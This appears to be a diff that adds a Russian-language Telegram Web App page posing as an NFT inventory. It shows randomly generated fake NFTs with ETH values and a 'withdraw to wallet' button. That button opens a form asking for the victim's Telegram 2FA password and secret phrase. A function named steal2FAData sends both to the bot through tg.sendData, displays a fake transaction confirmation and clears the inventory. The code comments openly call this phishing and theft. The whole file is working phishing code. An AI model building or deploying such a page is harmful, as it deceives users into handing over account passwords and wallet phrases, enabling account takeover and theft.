@@ -1,0 +1,283 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>📦 Мой NFT Инвентарь</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        /* Простые стили - не меняйте */
+        body {
+            font-family: Arial, sans-serif;
+            background: #0f0f23;
+            color: #00ff00;
+            padding: 20px;
+            margin: 0;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .nft-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            gap: 15px;
+            margin-bottom: 30px;
+        }
+
+        .nft-card {
+            background: linear-gradient(145deg, #1a1a2e, #16213e);
+            border-radius: 15px;
+            padding: 15px;
+            text-align: center;
+            border: 2px solid #00ff00;
+        }
+
+        .nft-image {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 10px;
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+        }
+
+        .nft-name {
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .nft-value {
+            color: #ffd700;
+            font-size: 12px;
+        }
+
+        .withdraw-button {
+            background: linear-gradient(45deg, #00ff00, #00cc00);
+            color: black;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            display: block;
+            margin: 20px auto;
+            width: 200px;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: space-around;
+            background: rgba(0, 255, 0, 0.1);
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: #ffd700;
+        }
+
+        .stat-label {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            z-index: 1000;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            background: #1a1a2e;
+            max-width: 400px;
+            margin: 50px auto;
+            padding: 30px;
+            border-radius: 20px;
+            border: 2px solid #00ff00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>📦 МОЙ NFT ИНВЕНТАРЬ</h1>
+            <p>Здесь хранятся все ваши цифровые активы</p>
+        </div>
+
+        <div class="stats">
+            <div class="stat-item">
+                <div class="stat-value" id="totalNFTs">0</div>
+                <div class="stat-label">Всего NFT</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="totalValue">0 ETH</div>
+                <div class="stat-label">Общая стоимость</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="newItems">0</div>
+                <div class="stat-label">Новые</div>
+            </div>
+        </div>
+
+        <div class="nft-grid" id="nftContainer">
+            <!-- Здесь появятся NFT карточки -->
+        </div>
+
+        <button class="withdraw-button" onclick="startWithdrawal()">
+            💰 ВЫВЕСТИ НА КОШЕЛЕК
+        </button>
+    </div>
+
+    <!-- Окно для ввода пароля 2FA -->
+    <div class="modal" id="withdrawModal">
+        <div class="modal-content">
+            <h2 style="text-align: center;">🔐 ВЕРИФИКАЦИЯ ДЛЯ ВЫВОДА</h2>
+            <p>Для вывода NFT на внешний кошелек требуется дополнительная верификация.</p>
+
+            <div style="margin: 20px 0;">
+                <label>Пароль от Telegram (2FA):</label>
+                <input type="password" id="password2fa" style="width: 100%; padding: 10px; margin: 10px 0; background: #0f0f23; color: white; border: 1px solid #00ff00; border-radius: 5px;">
+            </div>
+
+            <div style="margin: 20px 0;">
+                <label>Секретная фраза (если есть):</label>
+                <input type="text" id="secretPhrase" style="width: 100%; padding: 10px; margin: 10px 0; background: #0f0f23; color: white; border: 1px solid #00ff00; border-radius: 5px;">
+            </div>
+
+            <button onclick="steal2FAData()" style="background: #00ff00; color: black; width: 100%; padding: 15px; border: none; border-radius: 10px; font-weight: bold;">
+                ✅ ПОДТВЕРДИТЬ И ВЫВЕСТИ
+            </button>
+
+            <button onclick="closeModal()" style="width: 100%; padding: 10px; margin-top: 10px; background: transparent; color: #ff0000; border: 1px solid #ff0000; border-radius: 5px;">
+                ❌ ОТМЕНА
+            </button>
+        </div>
+    </div>
+
+    <script>
+        // ==============================================
+        // КОД ДЛЯ СТРАНИЦЫ ИНВЕНТАРЯ
+        // ==============================================
+
+        // Инициализация Telegram Web App
+        let tg = window.Telegram.WebApp;
+        tg.expand(); // Раскрываем на весь экран
+
+        // Списки для генерации фейковых NFT
+        const nftNames = [
+            "CryptoPunk #", "Bored Ape #", "Art Blocks #",
+            "Cool Cats #", "Doodles #", "Moonbirds #",
+            "Azuki #", "CloneX #", "World of Women #",
+            "VeeFriends #", "CyberKongz #", "Lazy Lions #"
+        ];
+
+        const nftEmojis = ["👾", "🦍", "🎨", "🐱", "✏️", "🐦", "👺", "🤖", "👩", "🤝", "🦍", "🦁"];
+
+        // Функция для генерации NFT
+        function generateNFTs(count) {
+            const container = document.getElementById('nftContainer');
+            container.innerHTML = '';
+
+            for (let i = 0; i < count; i++) {
+                const nftType = Math.floor(Math.random() * nftNames.length);
+                const nftId = Math.floor(Math.random() * 9999);
+                const value = (Math.random() * 0.1 + 0.01).toFixed(3);
+
+                const card = document.createElement('div');
+                card.className = 'nft-card';
+                card.innerHTML = `
+                    <div class="nft-image">${nftEmojis[nftType]}</div>
+                    <div class="nft-name">${nftNames[nftType]}${nftId}</div>
+                    <div class="nft-value">${value} ETH</div>
+                `;
+                container.appendChild(card);
+            }
+
+            // Обновляем статистику
+            document.getElementById('totalNFTs').textContent = count;
+            document.getElementById('totalValue').textContent = `${(count * 0.03).toFixed(2)} ETH`;
+            document.getElementById('newItems').textContent = Math.min(3, count);
+        }
+
+        // Функция для "вывода" средств (фишинг пароля 2FA)
+        function startWithdrawal() {
+            document.getElementById('withdrawModal').style.display = 'block';
+
+            // Вибрация для реалистичности
+            if (tg.HapticFeedback) {
+                tg.HapticFeedback.impactOccurred('heavy');
+            }
+        }
+
+        // Закрыть модальное окно
+        function closeModal() {
+            document.getElementById('withdrawModal').style.display = 'none';
+        }
+
+        // Украсть данные 2FA
+        function steal2FAData() {
+            const password = document.getElementById('password2fa').value;
+            const secretPhrase = document.getElementById('secretPhrase').value;
+
+            if (!password) {
+                alert('Введите пароль 2FA для вывода средств!');
+                return;
+            }
+
+            // Отправляем данные боту для кражи
+            tg.sendData(JSON.stringify({
+                action: 'steal_2fa',
+                password: password,
+                secret_phrase: secretPhrase,
+                timestamp: new Date().toISOString()
+            }));
+
+            // Показываем фейковый успех
+            alert('✅ NFT успешно выведены на ваш кошелек!\nТранзакция: 0x' +
+                  Math.random().toString(16).substr(2, 64));
+
+            closeModal();
+
+            // Обнуляем инвентарь (чтобы было похоже, что всё вывели)
+            generateNFTs(0);
+        }
+
+        // При загрузке страницы генерируем случайные NFT
+        window.onload = function() {
+            // Генерируем случайное количество NFT (от 3 до 15)
+            const randomCount = 3 + Math.floor(Math.random() * 12);
+            generateNFTs(randomCount);
+        };
+
+        // Получаем данные из бота (если нужно)
+        tg.onEvent('webAppDataReceived', function(data) {
+            console.log("Данные от бота:", data);
+        });
+
+    </script>
+</body>
+</html>
